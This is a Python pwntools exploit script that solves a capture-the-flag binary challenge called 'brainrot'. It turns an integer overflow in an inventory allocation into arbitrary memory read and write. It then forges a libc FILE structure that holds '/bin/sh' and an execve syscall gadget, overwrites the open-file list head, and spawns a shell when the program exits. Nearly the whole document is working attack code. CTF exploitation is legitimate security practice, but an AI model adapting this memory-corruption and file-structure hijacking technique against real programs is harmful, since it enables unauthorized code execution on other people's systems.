#!/usr/bin/env python3.13
# -*- coding: utf-8 -*-

from pwn import *
import re
from tqdm import tqdm
try: from fast_log import make_printv
except: make_printv = lambda **k: lambda *a, **kw: \
print(*a,*["%s: %s"%(k,(hex,repr)[type(v)!=int](v))for k,v in kw.items()],sep="\n")

exe = ELF("./challenge/brainrot", checksec=False)

context(
    binary=exe,
    log_level="info",
)

REMOTE_ADDR = "brainrot.challs.infobahnc.tf 1337"
def start(**kwargs):
    if args.REMOTE:
        return remote(*re.split(r":|\s", REMOTE_ADDR), **kwargs)
    else:
        # return gdb.debug([exe.path])
        return process([exe.path])

p = start()

sla=p.sendlineafter;sa=p.sendafter;sl=p.sendline;s=p.send
ru=p.recvuntil;rl=p.recvline;r=p.recv
ra = lambda to_skip, rcv_until=b"\n", drop=True: [ru(to_skip), ru(rcv_until, drop=drop)][-1]
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rol(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: ror(addr, 17) ^ cookie
ptr_getcookie = lambda mangled, demangled: ptr_demangle(mangled, demangled)
binsh = lambda: next(libc.search(b"/bin/sh\0"))
attach = lambda script=None, api=False: not args.REMOTE and gdb.attach(p, gdbscript=script, api=api)
u32d = lambda data: u32(data.ljust(4, b'\x00'))
u64d = lambda data: u64(data.ljust(8, b'\x00'))

bb = lambda data: data if isinstance(data, bytes) else data.encode()
snum = lambda num: str(num).encode()
hnum = lambda num: hex(num)[2:].encode()

logx = make_printv(log_fn=lambda k,v:info("%s: %s"%(k,v)))
warnx = make_printv(log_fn=lambda k,v:warn("%s: %s"%(k,v)))

PROMPT = b"> "
choice = lambda num: sla(PROMPT, snum(num))
slp = lambda data: sla(PROMPT, bb(data))

###################
## START EXPLOIT ##
###################

def steal(idx: int, brainrot: bytes|str):
    choice(1)
    sla(b": ", snum(idx))
    sla(b": ", bb(brainrot))

def check(idx: int):
    choice(2)
    sla(b": ", snum(idx))
    return int(ra(b"is generating $", b"/s").decode())

def arb_read(addr: int):
    assert addr % 4 == 0, "Must be aligned"
    if addr < ALLOC_ADDR:
        addr += 2 ** 64

    return check((addr - ALLOC_ADDR) // 4)

def arb_write(addr: int, brainrot: bytes|str):
    assert addr % 4 == 0, "Must be aligned"
    if addr < ALLOC_ADDR:
        addr += 2 ** 64

    return steal((addr - ALLOC_ADDR) // 4, brainrot)

brainrot_map = {
    'Meowl': 1,
    'Ballerina Cappuccina': 10,
    'John Pork': 100,
    'Job Job Job Sahur': 1000,
    'Odin Din Din Dun': 10000,
    'Orcalero Orcala': 100000,
    'Chimpanzini Bananini': 1000000,
    'Los 67': 67676767,
}

def calc_brainrots(to_generate: int):
    to_send = []
    cur = to_generate
    
    # number will start from 0, so we need to construct a
    # combination that will get us to the required value
    for key, val in sorted(brainrot_map.items(), key=lambda x: x[1], reverse=True):
        if cur >= val:
            num = cur // val
            to_send.extend([key] * num)
            cur -= val * num
    
    return to_send

# will overflow to just allocating + some ints and not error
sla(b"inventory? ", hex((2**64 + 0x90) // 4).encode())

# static address it allocates at every time
ALLOC_ADDR = 0xc00001a000

# attach("b*0x0000000000619652\nc")
# sanity check, read the header
assert arb_read(0x00400000) == 0x464c457f, "Arb read failed"

# attach("b*0x0000000000671FF8\nc")

# forge custom file structs that will be "closed" upon program exit which will call controlled function pointers.
# seems to be a part of the musl libc? idk
"""
void __fastcall close_file(__int64 i)
{
  __int64 v1; // rsi
  __int64 v2; // rax

  if ( i )
  {
    if ( *(i + 0x8C) >= 0 )
      (_lockfile)();
    if ( *(i + 0x28) != *(i + 0x38) )
      (*(i + 0x48))(i, 0, 0); // <---- easiest execve setup of all time
    v1 = *(i + 8);
    v2 = *(i + 16);
    if ( v1 != v2 )
      (*(i + 80))(i, v1 - v2, 1);
  }
}
"""

OFL_HEAD = 0x0000000000A98830
EXECVE_SYSCALL = 0x0000000000665bb1 # mov eax, 0x3b; syscall; ; 

fake_file = flat({
    0x0: b"/bin/sh",
    0x28: 1, # wpos
    0x38: 0, # wbase
    0x48: EXECVE_SYSCALL,
    0x8C: 67676767 * 32, # lock
}, filler=b"\0")

# write our fake struct now
WRITE_ADDR = 0x0000000000A97620 # tlsprintf_buf_3, not used in any relevant way by the program
for i in range(0, len(fake_file), 4):
    chunk = u32(fake_file[i:i+4])
    if chunk == 0:
        continue

    to_send = calc_brainrots(chunk)
    info(f"Sending {len(to_send):#x} brainrots for chunk {i // 4:#x}")
    for brainrot in tqdm(to_send):
        arb_write(WRITE_ADDR + i, brainrot)

# now write the ptr to ofl_head
info("Overwriting ofl_head")
for brainrot in tqdm(calc_brainrots(WRITE_ADDR)):
    arb_write(OFL_HEAD, brainrot)

info("Getting shell")
choice(3)

p.interactive()
